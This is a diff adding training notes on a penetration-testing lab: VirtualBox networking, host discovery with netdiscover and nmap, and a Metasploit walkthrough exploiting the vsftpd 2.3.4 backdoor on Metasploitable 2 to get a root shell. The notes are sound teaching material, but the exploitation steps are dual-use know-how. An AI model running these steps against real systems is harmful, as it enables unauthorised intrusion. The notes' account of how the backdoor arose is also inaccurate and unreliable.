@@ -4296,3 +4296,1977 @@ A rootkit is malware designed primarily to hide malicious activity by concealing
 - Steganography hides information inside other files, whereas encryption protects the content of visible data.
 - Rootkits focus on hiding malicious activity rather than performing the initial attack.
 - Defense in depth, least privilege, endpoint detection, monitoring, and regular auditing significantly reduce the effectiveness of post-exploitation techniques.
+
+
+# Session 10 – Password Cracking, Exploitation, Privilege Escalation and Post Exploitation
+# Part 4 – Practical Lab Setup (Kali Linux & Metasploitable 2)
+
+---
+
+# Introduction
+
+The second half of this session shifted from theoretical concepts to a practical penetration testing demonstration.
+
+The instructor demonstrated the complete workflow using two virtual machines:
+
+- Kali Linux (Attacker Machine)
+- Metasploitable 2 (Victim Machine)
+
+The purpose of this lab was **not simply to exploit a machine**, but to demonstrate the complete penetration testing methodology discussed in previous sessions.
+
+Students observed how an attacker moves through the following stages:
+
+```text
+Prepare Lab
+      ↓
+Verify Connectivity
+      ↓
+Discover Hosts
+      ↓
+Scan Ports
+      ↓
+Identify Services
+      ↓
+Search Vulnerabilities
+      ↓
+Select Exploit
+      ↓
+Gain Access
+      ↓
+Perform Post Exploitation
+```
+
+This workflow represents one of the most common penetration testing methodologies used in real-world assessments.
+
+---
+
+# Lab Environment
+
+The instructor used the following laboratory environment.
+
+## Attacker Machine
+
+Operating System
+
+```text
+Kali Linux
+```
+
+Purpose
+
+- Reconnaissance
+- Scanning
+- Enumeration
+- Exploitation
+- Password Cracking
+
+Kali Linux comes pre-installed with hundreds of penetration testing tools including:
+
+- Nmap
+- Metasploit Framework
+- Hydra
+- John the Ripper
+- Burp Suite
+- Wireshark
+- sqlmap
+- Netdiscover
+
+---
+
+## Victim Machine
+
+Operating System
+
+```text
+Metasploitable 2
+```
+
+Purpose
+
+Metasploitable is an intentionally vulnerable Linux virtual machine developed for security training.
+
+Unlike a normal Linux server, Metasploitable intentionally contains:
+
+- Outdated software
+- Weak passwords
+- Vulnerable services
+- Misconfigured applications
+
+The goal is to safely practice penetration testing techniques.
+
+---
+
+# Why Metasploitable?
+
+The instructor specifically chose Metasploitable because it contains numerous real-world vulnerabilities.
+
+Examples include:
+
+- Vulnerable FTP server
+- Vulnerable Samba service
+- Vulnerable Web Server
+- Weak authentication
+- Default credentials
+- Old software versions
+
+Instead of attacking production systems,
+
+students attack a machine that is intentionally insecure.
+
+---
+
+# VirtualBox Architecture
+
+Both machines were running inside Oracle VirtualBox.
+
+```
++------------------------------------------------+
+|              Host Computer                     |
+|                                                |
+|   +--------------------+                       |
+|   | Kali Linux VM      |                       |
+|   +--------------------+                       |
+|                                                |
+|   +--------------------+                       |
+|   | Metasploitable VM  |                       |
+|   +--------------------+                       |
+|                                                |
++------------------------------------------------+
+```
+
+Communication occurs through VirtualBox virtual networking.
+
+---
+
+# Why Networking Matters
+
+Before scanning,
+
+both virtual machines must communicate.
+
+If networking is incorrect,
+
+nothing else will work.
+
+Examples:
+
+```text
+Nmap
+
+×
+
+Metasploit
+
+×
+
+Hydra
+
+×
+
+SSH
+
+×
+
+FTP
+
+×
+
+Ping
+```
+
+Everything depends on network connectivity.
+
+---
+
+# Network Adapters in VirtualBox
+
+VirtualBox provides several networking modes.
+
+The instructor discussed these while troubleshooting connectivity.
+
+---
+
+# NAT (Network Address Translation)
+
+In NAT mode,
+
+the virtual machine can access the Internet,
+
+but other virtual machines generally cannot initiate connections to it.
+
+```
+VM
+ │
+ ▼
+VirtualBox NAT
+ │
+ ▼
+Internet
+```
+
+Advantages
+
+- Easy Internet access
+- Simple configuration
+
+Disadvantages
+
+- Difficult for penetration testing
+- Machines cannot freely discover each other
+
+---
+
+# Bridged Adapter
+
+In Bridged mode,
+
+the virtual machine behaves like another physical computer on the network.
+
+```
+Router
+ │
+ ├──────── Laptop
+ │
+ ├──────── Phone
+ │
+ └──────── Kali VM
+```
+
+Advantages
+
+- Receives its own IP
+- Accessible from the LAN
+
+Disadvantages
+
+- Not ideal for isolated practice labs
+
+---
+
+# Host-Only Adapter
+
+Host-Only networking creates a private network between:
+
+- Host Computer
+- Virtual Machines
+
+```
+Host
+ │
+ ├──── Kali
+ │
+ └──── Metasploitable
+```
+
+Advantages
+
+- Safe
+- Isolated
+- Commonly used in labs
+
+---
+
+# Internal Network
+
+Internal Network isolates communication completely.
+
+```
+Kali
+ │
+ ▼
+Virtual Network
+ │
+ ▼
+Metasploitable
+```
+
+No Internet access.
+
+Only participating virtual machines communicate.
+
+---
+
+# Which Mode is Best?
+
+For penetration testing practice,
+
+Host-Only or Internal Network is generally preferred because:
+
+- Safe
+- Isolated
+- Predictable
+- No risk to external devices
+
+---
+
+# IP Address Verification
+
+Before scanning,
+
+both systems must have valid IP addresses.
+
+Typical command on Kali
+
+```bash
+ip addr
+```
+
+or
+
+```bash
+ifconfig
+```
+
+Example output
+
+```text
+eth0
+
+192.168.56.101
+```
+
+Metasploitable
+
+```text
+192.168.56.102
+```
+
+Both machines must belong to the same subnet.
+
+---
+
+# Understanding the Subnet
+
+Example
+
+```
+Kali
+
+192.168.56.101
+
+Metasploitable
+
+192.168.56.102
+```
+
+Network
+
+```
+192.168.56.0/24
+```
+
+Since both belong to the same subnet,
+
+communication is possible.
+
+---
+
+# Connectivity Test
+
+Before performing reconnaissance,
+
+always verify communication.
+
+Command
+
+```bash
+ping 192.168.56.102
+```
+
+Expected output
+
+```text
+64 bytes from 192.168.56.102
+
+icmp_seq=1
+
+ttl=64
+
+time=0.4 ms
+```
+
+Successful replies indicate:
+
+- Layer 3 connectivity
+- IP configuration correct
+- Machines reachable
+
+---
+
+# Understanding Ping
+
+Ping uses:
+
+```text
+ICMP
+
+Internet Control Message Protocol
+```
+
+Purpose
+
+- Test connectivity
+- Measure latency
+- Confirm host availability
+
+Ping is one of the first commands executed during penetration testing.
+
+---
+
+# Understanding TTL
+
+The instructor briefly discussed TTL values.
+
+TTL means
+
+```text
+Time To Live
+```
+
+TTL limits how many routers a packet may traverse.
+
+Every router decreases TTL by one.
+
+When TTL reaches zero,
+
+the packet is discarded.
+
+---
+
+# Why TTL Helps Fingerprinting
+
+Different operating systems use different default TTL values.
+
+Typical examples
+
+```text
+Linux
+
+64
+
+Windows
+
+128
+
+Cisco
+
+255
+```
+
+These values help estimate the target operating system during reconnaissance.
+
+However,
+
+TTL alone should never be considered definitive.
+
+---
+
+# Common Connectivity Problems
+
+During the demonstration,
+
+networking issues occurred before scanning began.
+
+Typical causes include:
+
+- Wrong adapter selected
+- Different subnets
+- VM powered off
+- Duplicate IP address
+- Incorrect DHCP configuration
+- Firewall blocking traffic
+- Internal Network name mismatch
+
+---
+
+# Troubleshooting Workflow
+
+Whenever two virtual machines cannot communicate,
+
+follow this sequence:
+
+```text
+Check VM Power
+
+↓
+
+Check Adapter Type
+
+↓
+
+Check Adapter Enabled
+
+↓
+
+Verify IP Address
+
+↓
+
+Verify Subnet
+
+↓
+
+Ping
+
+↓
+
+Verify Firewall
+
+↓
+
+Proceed to Scanning
+```
+
+Skipping these checks often wastes significant troubleshooting time.
+
+---
+
+# Why the Instructor Spent Time on Networking
+
+Students often want to jump directly to exploitation.
+
+However,
+
+professional penetration testers know that **successful attacks depend on proper preparation**.
+
+Poor networking configuration leads to:
+
+- Failed scans
+- False assumptions
+- Incorrect vulnerability analysis
+- Exploit failures
+
+Therefore,
+
+network verification is always the first practical step.
+
+---
+
+# Practical Best Practices
+
+Before beginning any assessment:
+
+- Verify IP addresses.
+- Verify subnet masks.
+- Test connectivity using `ping`.
+- Confirm that the target is reachable.
+- Ensure both machines are in the intended virtual network.
+- Record IP addresses for documentation.
+
+---
+
+# Interview Questions
+
+## Why is Host-Only networking commonly used in penetration testing labs?
+
+Because it isolates the lab from external networks while allowing communication between virtual machines.
+
+---
+
+## Why should connectivity be verified before running Nmap?
+
+If the target is unreachable, scan results will be misleading or empty. Verifying connectivity prevents unnecessary troubleshooting later.
+
+---
+
+## What is the purpose of Ping?
+
+Ping uses ICMP to verify whether a remote host is reachable and to measure network latency.
+
+---
+
+## What does TTL indicate?
+
+TTL (Time To Live) limits the number of network hops a packet can traverse. Its default value can also provide clues about the target operating system.
+
+---
+
+# Key Takeaways
+
+- Proper lab preparation is the foundation of successful penetration testing.
+- Kali Linux serves as the attacker machine, while Metasploitable 2 is an intentionally vulnerable target.
+- VirtualBox networking modes determine how virtual machines communicate.
+- Host-Only and Internal Network modes are preferred for isolated practice labs.
+- Always verify IP configuration and connectivity before beginning reconnaissance.
+- Ping and TTL provide valuable initial information during network verification.
+- Professional penetration testers always validate the environment before running scanners or exploits.
+
+# Session 10 – Password Cracking, Exploitation, Privilege Escalation and Post Exploitation
+# Part 4B – Host Discovery and Enumeration using Netdiscover and Nmap
+
+---
+
+# Introduction
+
+After configuring the laboratory environment and verifying that Kali Linux and Metasploitable could communicate, the instructor began the reconnaissance phase.
+
+The primary objective of reconnaissance is to answer four fundamental questions:
+
+1. Is the target alive?
+2. What is the target's IP address?
+3. Which services are running?
+4. Which vulnerabilities might exist?
+
+Rather than attacking immediately, ethical hackers first collect as much information as possible.
+
+The instructor repeatedly emphasized an important penetration testing principle:
+
+```text
+More Information
+
+↓
+
+Better Attack Decisions
+
+↓
+
+Higher Probability of Success
+```
+
+Reconnaissance is therefore one of the most important stages of any penetration test.
+
+---
+
+# Passive vs Active Reconnaissance
+
+Before beginning practical scanning, it is important to understand the two types of reconnaissance.
+
+## Passive Reconnaissance
+
+Passive reconnaissance gathers information **without directly interacting with the target**.
+
+Examples:
+
+- Google Search
+- Company Website
+- LinkedIn
+- DNS Records
+- WHOIS
+- Social Media
+- Public GitHub Repositories
+- Shodan
+
+Advantages:
+
+- Difficult to detect
+- No direct contact with the target
+- Useful before penetration testing
+
+---
+
+## Active Reconnaissance
+
+Active reconnaissance involves directly communicating with the target system.
+
+Examples:
+
+- Ping
+- Nmap
+- Netdiscover
+- Banner Grabbing
+- Service Enumeration
+
+Advantages:
+
+- Provides accurate technical information
+- Reveals live hosts
+- Identifies running services
+
+Disadvantages:
+
+- May generate logs
+- Can trigger intrusion detection systems
+- Easier for defenders to notice
+
+The practical demonstration focused primarily on **active reconnaissance**.
+
+---
+
+# Host Discovery
+
+Before scanning ports, the attacker must determine whether the target machine is online.
+
+Typical workflow:
+
+```text
+Unknown Network
+
+↓
+
+Discover Live Hosts
+
+↓
+
+Identify Target IP
+
+↓
+
+Scan Ports
+
+↓
+
+Enumerate Services
+```
+
+---
+
+# Netdiscover
+
+## Introduction
+
+The first tool demonstrated during reconnaissance was **Netdiscover**.
+
+Netdiscover is a network reconnaissance tool used to discover live hosts on a local network.
+
+Unlike Nmap, which primarily scans ports, Netdiscover focuses on identifying devices connected to the local subnet.
+
+---
+
+# How Netdiscover Works
+
+Netdiscover uses the **Address Resolution Protocol (ARP)**.
+
+Workflow:
+
+```text
+Broadcast ARP Request
+
+↓
+
+Devices Reply
+
+↓
+
+Collect MAC Addresses
+
+↓
+
+Display Live Hosts
+```
+
+Since ARP operates within the local network, Netdiscover is extremely effective for LAN host discovery.
+
+---
+
+# Why ARP?
+
+ARP (Address Resolution Protocol) maps:
+
+```text
+IP Address
+
+↓
+
+MAC Address
+```
+
+When Kali broadcasts an ARP request asking:
+
+```text
+Who has 192.168.56.102?
+```
+
+The device owning that IP responds with its MAC address.
+
+This allows Netdiscover to build a table of active systems.
+
+---
+
+# Command Used
+
+The instructor demonstrated:
+
+```bash
+netdiscover
+```
+
+or
+
+```bash
+netdiscover -r 192.168.56.0/24
+```
+
+where:
+
+- `-r` specifies the IP range to scan.
+
+---
+
+# Sample Output
+
+```text
+IP Address        MAC Address             Vendor
+
+192.168.56.1      08:00:27:AA:11:22      Oracle
+
+192.168.56.101    08:00:27:11:22:33      Oracle
+
+192.168.56.102    08:00:27:44:55:66      Oracle
+```
+
+---
+
+# Understanding the Output
+
+Each row provides:
+
+### IP Address
+
+The network address of the device.
+
+Example:
+
+```text
+192.168.56.102
+```
+
+---
+
+### MAC Address
+
+The hardware address of the network interface.
+
+Example:
+
+```text
+08:00:27:44:55:66
+```
+
+---
+
+### Vendor
+
+The manufacturer identified from the MAC prefix.
+
+Example:
+
+```text
+Oracle
+```
+
+Since both virtual machines are running in Oracle VirtualBox, Oracle appears as the vendor.
+
+---
+
+# Why Netdiscover is Useful
+
+Netdiscover quickly answers:
+
+- Which devices are online?
+- Which IP addresses exist?
+- Which MAC addresses belong to those devices?
+- Which vendor manufactured the network interface?
+
+This information is valuable before performing deeper scans.
+
+---
+
+# Transition to Nmap
+
+Once the instructor identified the Metasploitable machine, the next step was to determine:
+
+- Which ports are open?
+- Which services are running?
+- Which operating system is installed?
+- Which versions of software are present?
+
+For this purpose, the instructor used **Nmap**.
+
+---
+
+# What is Nmap?
+
+Nmap stands for:
+
+```text
+Network Mapper
+```
+
+It is one of the most widely used network reconnaissance and security auditing tools.
+
+Nmap is capable of:
+
+- Host discovery
+- Port scanning
+- Service detection
+- Operating system detection
+- Version detection
+- Script execution
+- Vulnerability identification
+
+---
+
+# Why Nmap is Essential
+
+Almost every penetration test begins with Nmap.
+
+Without knowing:
+
+- Open ports
+- Running services
+- Operating system
+
+it is impossible to choose appropriate exploits.
+
+---
+
+# General Nmap Workflow
+
+```text
+Target IP
+
+↓
+
+Host Discovery
+
+↓
+
+Port Scan
+
+↓
+
+Identify Open Ports
+
+↓
+
+Service Detection
+
+↓
+
+Version Detection
+
+↓
+
+Operating System Detection
+
+↓
+
+Attack Planning
+```
+
+---
+
+# TCP Ports
+
+A TCP port identifies a specific network service running on a computer.
+
+Examples:
+
+| Port | Service |
+|------|----------|
+| 21 | FTP |
+| 22 | SSH |
+| 23 | Telnet |
+| 25 | SMTP |
+| 53 | DNS |
+| 80 | HTTP |
+| 110 | POP3 |
+| 139 | NetBIOS |
+| 143 | IMAP |
+| 443 | HTTPS |
+| 445 | SMB |
+| 3306 | MySQL |
+
+Open ports indicate services that may become attack targets.
+
+---
+
+# Basic Nmap Scan
+
+The instructor demonstrated a basic scan using:
+
+```bash
+nmap <target-ip>
+```
+
+Example:
+
+```bash
+nmap 192.168.56.102
+```
+
+Nmap attempts to identify:
+
+- Live host
+- Open ports
+- Closed ports
+- Filtered ports
+
+---
+
+# Understanding Port States
+
+### Open
+
+A service is actively listening.
+
+Example:
+
+```text
+22/tcp open ssh
+```
+
+---
+
+### Closed
+
+No service is listening.
+
+The machine is reachable.
+
+---
+
+### Filtered
+
+A firewall or filtering device prevented Nmap from determining the port state.
+
+---
+
+# Service Detection
+
+The instructor then demonstrated service detection.
+
+Example command:
+
+```bash
+nmap -sV 192.168.56.102
+```
+
+The `-sV` option enables:
+
+```text
+Service Version Detection
+```
+
+Instead of displaying only:
+
+```text
+21 open
+```
+
+Nmap displays:
+
+```text
+21 open ftp vsftpd 2.3.4
+```
+
+Software versions are critical because exploits are almost always version-specific.
+
+---
+
+# Operating System Detection
+
+The instructor also demonstrated OS fingerprinting.
+
+Command:
+
+```bash
+nmap -O 192.168.56.102
+```
+
+The `-O` option attempts to determine the operating system.
+
+Example output:
+
+```text
+Linux 2.6.x
+```
+
+Nmap estimates the operating system by analyzing:
+
+- TCP responses
+- ICMP behavior
+- TCP window sizes
+- TTL values
+- Packet characteristics
+
+---
+
+# Aggressive Scan
+
+One of the most useful demonstrations was the aggressive scan.
+
+Command:
+
+```bash
+nmap -A 192.168.56.102
+```
+
+The `-A` option combines several advanced features:
+
+- Operating system detection
+- Version detection
+- Default NSE scripts
+- Traceroute
+
+This provides a large amount of information in a single scan.
+
+---
+
+# SYN Scan
+
+The instructor discussed the SYN scan.
+
+Command:
+
+```bash
+nmap -sS 192.168.56.102
+```
+
+This is often called a **Stealth Scan**.
+
+Instead of completing the full TCP handshake, Nmap sends only the SYN packet and analyzes the response.
+
+Advantages:
+
+- Faster
+- Lower network overhead
+- Historically more difficult to detect
+
+---
+
+# Understanding Banner Grabbing
+
+Many network services identify themselves when contacted.
+
+Example:
+
+```text
+220 (vsFTPd 2.3.4)
+```
+
+This is known as a **banner**.
+
+Banner grabbing helps identify:
+
+- Software
+- Version
+- Vendor
+
+This information guides vulnerability research.
+
+---
+
+# Practical Output Interpretation
+
+Suppose Nmap reports:
+
+```text
+21/tcp open ftp vsftpd 2.3.4
+
+22/tcp open ssh OpenSSH
+
+80/tcp open http Apache
+
+3306/tcp open mysql
+```
+
+A penetration tester immediately begins asking:
+
+- Is VSFTPD vulnerable?
+- Is Apache outdated?
+- Can MySQL be accessed?
+- Are default credentials present?
+- Is anonymous FTP enabled?
+
+Scanning is not the goal.
+
+Scanning provides the information needed to decide **what to test next**.
+
+---
+
+# Professional Penetration Testing Mindset
+
+The instructor emphasized that professionals do **not** attack every open port blindly.
+
+Instead, they prioritize based on:
+
+- Software version
+- Known vulnerabilities
+- Business impact
+- Ease of exploitation
+
+This approach reduces unnecessary risk and improves efficiency.
+
+---
+
+# Interview Questions
+
+## What is Netdiscover?
+
+Netdiscover is a host discovery tool that uses ARP requests to identify live devices on a local network.
+
+---
+
+## Why is ARP used by Netdiscover?
+
+ARP maps IP addresses to MAC addresses, allowing Netdiscover to identify active hosts on the local subnet.
+
+---
+
+## What is Nmap?
+
+Nmap (Network Mapper) is a network scanning tool used for host discovery, port scanning, service detection, operating system fingerprinting, and security auditing.
+
+---
+
+## What does `-sV` do?
+
+It enables service version detection.
+
+---
+
+## What does `-O` do?
+
+It attempts to identify the target operating system.
+
+---
+
+## What does `-A` do?
+
+It performs an aggressive scan by combining OS detection, version detection, default NSE scripts, and traceroute.
+
+---
+
+## What is a SYN scan?
+
+A SYN scan (`-sS`) sends TCP SYN packets without completing the full handshake, making it efficient and historically more difficult to detect than a full TCP connect scan.
+
+---
+
+# Key Takeaways
+
+- Reconnaissance begins by identifying live hosts.
+- Netdiscover uses ARP to discover devices on the local network.
+- Nmap is one of the most important tools in penetration testing.
+- Port scanning identifies potential attack surfaces.
+- Service version detection is essential because exploits are version-specific.
+- Operating system fingerprinting helps narrow down possible vulnerabilities.
+- Banner grabbing provides software and version information.
+- The purpose of scanning is to build an informed attack plan, not to attack blindly.
+
+# Session 10 – Password Cracking, Exploitation, Privilege Escalation and Post-Exploitation
+## Part 4C – Exploitation using the Metasploit Framework (VSFTPD 2.3.4 Practical)
+
+---
+
+# Introduction
+
+After identifying the target operating system, open ports, and running services using Nmap, the instructor moved to the exploitation phase.
+
+At this point, the penetration tester already knows:
+
+- The target IP address
+- The operating system
+- The software versions
+- The exposed services
+
+Now the objective is to determine whether any of these services contain known vulnerabilities that can be safely demonstrated in the lab.
+
+Rather than writing custom exploit code from scratch, penetration testers commonly use the **Metasploit Framework**, one of the most widely used penetration testing platforms.
+
+---
+
+# What is Metasploit?
+
+The Metasploit Framework is an open-source penetration testing framework that provides a large collection of exploits, payloads, auxiliary modules, encoders, post-exploitation modules, and tools.
+
+It simplifies the exploitation process by providing reusable modules for thousands of known vulnerabilities.
+
+Instead of manually writing exploit code, the tester selects the appropriate exploit module, configures it, and executes it.
+
+---
+
+# Why Metasploit is Important
+
+Metasploit helps security professionals:
+
+- Validate vulnerabilities
+- Demonstrate real-world impact
+- Test exploitability
+- Verify patches
+- Perform penetration testing
+- Conduct security research
+
+It is used extensively by:
+
+- Penetration Testers
+- Red Teams
+- Security Researchers
+- Incident Response Teams
+- Security Consultants
+
+---
+
+# Metasploit Architecture
+
+The framework consists of several module types.
+
+```text
+                 Metasploit Framework
+                         │
+ ┌──────────────┬───────────────┬───────────────┬───────────────┐
+ │              │               │               │
+Exploits     Payloads      Auxiliary       Post Modules
+ │              │               │               │
+Exploit     Reverse Shell    Scanner      Privilege Escalation
+Buffer OF    Meterpreter     Brute Force  Credential Dumping
+RCE          Bind Shell      Fuzzing      Enumeration
+```
+
+Each module serves a different purpose.
+
+---
+
+# Main Module Types
+
+## Exploit Modules
+
+Exploit modules take advantage of vulnerabilities.
+
+Example:
+
+```text
+vsftpd Backdoor
+
+MS08-067
+
+EternalBlue
+
+Apache Exploits
+```
+
+---
+
+## Payload Modules
+
+Payloads determine what happens after exploitation succeeds.
+
+Examples:
+
+- Command Shell
+- Reverse Shell
+- Meterpreter
+- File Download
+- PowerShell Execution
+
+---
+
+## Auxiliary Modules
+
+Auxiliary modules perform tasks that do not necessarily exploit vulnerabilities.
+
+Examples:
+
+- Port Scanning
+- Banner Grabbing
+- SMB Enumeration
+- FTP Enumeration
+- SSH Login Testing
+- Brute Force Attacks
+
+---
+
+## Post Modules
+
+These are executed after successful exploitation.
+
+Examples:
+
+- System Enumeration
+- Password Hash Collection
+- Privilege Escalation
+- Network Discovery
+- Persistence
+
+---
+
+# Starting Metasploit
+
+The instructor launched Metasploit using:
+
+```bash
+msfconsole
+```
+
+This starts the Metasploit interactive console.
+
+During startup,
+
+Metasploit loads:
+
+- Modules
+- Plugins
+- Database
+- Framework Components
+
+After loading,
+
+the user is presented with the Metasploit prompt.
+
+Example:
+
+```text
+msf6 >
+```
+
+This prompt indicates that the framework is ready.
+
+---
+
+# Searching for Exploits
+
+Rather than memorizing thousands of exploits,
+
+Metasploit provides a search feature.
+
+General syntax:
+
+```bash
+search <keyword>
+```
+
+Example:
+
+```bash
+search vsftpd
+```
+
+Metasploit searches its exploit database and returns matching modules.
+
+---
+
+# Understanding Search Results
+
+Typical output contains:
+
+- Module Name
+- Disclosure Date
+- Rank
+- Description
+
+Example:
+
+```text
+exploit/unix/ftp/vsftpd_234_backdoor
+```
+
+This tells us:
+
+Target Software:
+
+```text
+vsftpd
+```
+
+Version:
+
+```text
+2.3.4
+```
+
+Exploit Type:
+
+```text
+FTP Backdoor
+```
+
+---
+
+# Why Search First?
+
+Professionals never assume an exploit exists.
+
+Instead they:
+
+```text
+Identify Service
+
+↓
+
+Identify Version
+
+↓
+
+Search Exploit
+
+↓
+
+Verify Compatibility
+
+↓
+
+Configure Module
+```
+
+---
+
+# Selecting an Exploit
+
+Once the correct exploit is found,
+
+the instructor selected it using:
+
+```bash
+use exploit/unix/ftp/vsftpd_234_backdoor
+```
+
+The console prompt changes.
+
+Example:
+
+```text
+msf6 exploit(vsftpd_234_backdoor) >
+```
+
+This confirms that the exploit module has been loaded.
+
+---
+
+# Viewing Module Information
+
+Before launching any exploit,
+
+a penetration tester should understand:
+
+- What vulnerability it targets
+- Supported platforms
+- Required parameters
+- References
+- Limitations
+
+Command:
+
+```bash
+info
+```
+
+This displays detailed information about the selected module.
+
+---
+
+# Viewing Required Options
+
+Each exploit requires certain parameters.
+
+The instructor demonstrated:
+
+```bash
+show options
+```
+
+Typical output includes:
+
+```text
+RHOSTS
+
+RPORT
+
+SSL
+
+TARGET
+```
+
+Only after the required values are configured can the exploit execute.
+
+---
+
+# Understanding Important Parameters
+
+## RHOSTS
+
+Remote Host.
+
+The target IP address.
+
+Example:
+
+```text
+192.168.56.102
+```
+
+---
+
+## RPORT
+
+Remote Port.
+
+Default FTP port:
+
+```text
+21
+```
+
+---
+
+## TARGET
+
+Specifies the operating system or application version if multiple targets are supported.
+
+---
+
+# Configuring the Target
+
+The instructor configured the target machine using:
+
+```bash
+set RHOSTS 192.168.56.102
+```
+
+Metasploit responds:
+
+```text
+RHOSTS => 192.168.56.102
+```
+
+This confirms the parameter has been set successfully.
+
+---
+
+# Verifying Configuration
+
+After setting parameters,
+
+experienced penetration testers run:
+
+```bash
+show options
+```
+
+again to verify that:
+
+- Required values are present
+- No mandatory parameters are missing
+
+Skipping this step often causes exploit failures.
+
+---
+
+# Launching the Exploit
+
+After configuration,
+
+the instructor executed:
+
+```bash
+run
+```
+
+or equivalently:
+
+```bash
+exploit
+```
+
+Metasploit begins interacting with the target service.
+
+Typical workflow:
+
+```text
+Connect
+
+↓
+
+Verify Service
+
+↓
+
+Trigger Vulnerability
+
+↓
+
+Send Payload
+
+↓
+
+Wait for Response
+```
+
+---
+
+# VSFTPD 2.3.4 Backdoor Vulnerability
+
+The practical demonstration focused on:
+
+```text
+vsftpd 2.3.4
+```
+
+This version contains a well-known backdoor that was accidentally introduced into a maliciously modified source package in 2011.
+
+The backdoored version allows an attacker to obtain a shell under specific conditions.
+
+Because Metasploitable intentionally includes this vulnerable version,
+
+it is commonly used in cybersecurity training.
+
+---
+
+# Why This Works in Metasploitable
+
+Metasploitable is intentionally designed to contain vulnerable software.
+
+The objective is educational.
+
+This exploit succeeds because:
+
+- The vulnerable version is installed.
+- No security patches have been applied.
+- The environment is isolated.
+
+In production environments,
+
+patched versions would not be vulnerable.
+
+---
+
+# Successful Exploitation
+
+If exploitation succeeds,
+
+Metasploit displays output similar to:
+
+```text
+Command shell session opened
+```
+
+This indicates that the attacker has successfully obtained command execution on the target.
+
+---
+
+# What is a Session?
+
+A session represents an active connection between the attacker and the compromised machine.
+
+Example:
+
+```text
+Session 1
+```
+
+Each successful exploit generally creates a new session.
+
+Multiple compromised machines may result in multiple active sessions.
+
+---
+
+# Interacting with the Session
+
+To interact with the shell:
+
+```bash
+sessions
+```
+
+Displays all active sessions.
+
+Example:
+
+```text
+ID   Name    Type
+
+1            Shell
+```
+
+To connect:
+
+```bash
+sessions -i 1
+```
+
+Metasploit switches to the compromised system.
+
+---
+
+# Verifying Access
+
+One of the first commands executed after exploitation is:
+
+```bash
+whoami
+```
+
+Purpose:
+
+Determine the current user.
+
+Example output:
+
+```text
+root
+```
+
+This confirms that exploitation resulted in root-level access.
+
+---
+
+# Basic Post-Exploitation Commands
+
+The instructor demonstrated simple Linux commands to verify control over the victim machine.
+
+Examples include:
+
+Current directory:
+
+```bash
+pwd
+```
+
+List files:
+
+```bash
+ls
+```
+
+Display operating system information:
+
+```bash
+uname -a
+```
+
+Current user:
+
+```bash
+whoami
+```
+
+Hostname:
+
+```bash
+hostname
+```
+
+These commands help the tester understand the compromised environment.
+
+---
+
+# Demonstrating Control
+
+To demonstrate successful exploitation,
+
+the instructor performed simple file operations.
+
+Examples:
+
+Create a directory:
+
+```bash
+mkdir demo
+```
+
+Create a file:
+
+```bash
+touch test.txt
+```
+
+List files:
+
+```bash
+ls
+```
+
+Remove the file:
+
+```bash
+rm test.txt
+```
+
+These actions demonstrate that commands are executing on the victim machine rather than on Kali Linux.
+
+---
+
+# Why Simple Commands Matter
+
+The objective is **not** to damage the system.
+
+Instead,
+
+the penetration tester proves that:
+
+- Code execution exists.
+- Administrative privileges have been obtained.
+- The vulnerability is real.
+
+This proof is later included in the penetration testing report.
+
+---
+
+# Cleaning Up
+
+Professional penetration testers avoid leaving unnecessary changes on the target.
+
+After demonstrating the vulnerability,
+
+temporary files created during testing should be removed.
+
+The system should be returned to its original state whenever possible.
+
+---
+
+# Practical Lessons from the Demonstration
+
+The VSFTPD lab demonstrates several important concepts:
+
+- Vulnerable software versions are dangerous.
+- Service version detection directly influences exploit selection.
+- Metasploit simplifies exploitation but still requires understanding of the target.
+- Successful exploitation should always be verified.
+- Ethical penetration testing focuses on demonstrating impact, not causing damage.
+
+---
+
+# Interview Questions
+
+## What is the Metasploit Framework?
+
+Metasploit is an open-source penetration testing framework that provides exploits, payloads, scanners, and post-exploitation modules for security testing.
+
+---
+
+## What does `msfconsole` do?
+
+It launches the interactive Metasploit Framework console.
+
+---
+
+## What is the purpose of the `search` command?
+
+It searches the Metasploit module database for exploits, payloads, auxiliary modules, or post-exploitation modules.
+
+---
+
+## What is `RHOSTS`?
+
+`RHOSTS` specifies the IP address or addresses of the target system.
+
+---
+
+## What is the difference between `run` and `exploit`?
+
+Both commands execute the configured exploit. In most modules, they are functionally equivalent.
+
+---
+
+## What is a Metasploit session?
+
+A session is an active connection established between the attacker and a successfully exploited target.
+
+---
+
+## Why was VSFTPD 2.3.4 vulnerable?
+
+The version used in Metasploitable contains a well-known backdoored release intended for educational demonstration. Modern patched versions are not affected.
+
+---
+
+# Key Takeaways
+
+- Metasploit is a modular penetration testing framework that simplifies vulnerability validation.
+- Exploit selection is based on accurate service and version detection.
+- `msfconsole`, `search`, `use`, `show options`, `set RHOSTS`, and `run` form the core exploitation workflow.
+- Successful exploitation creates a session that allows interaction with the compromised system.
+- Simple verification commands such as `whoami`, `pwd`, and `ls` confirm successful remote code execution.
+- Ethical penetration testing emphasizes demonstrating vulnerabilities safely and documenting evidence rather than damaging the target system.
+
+
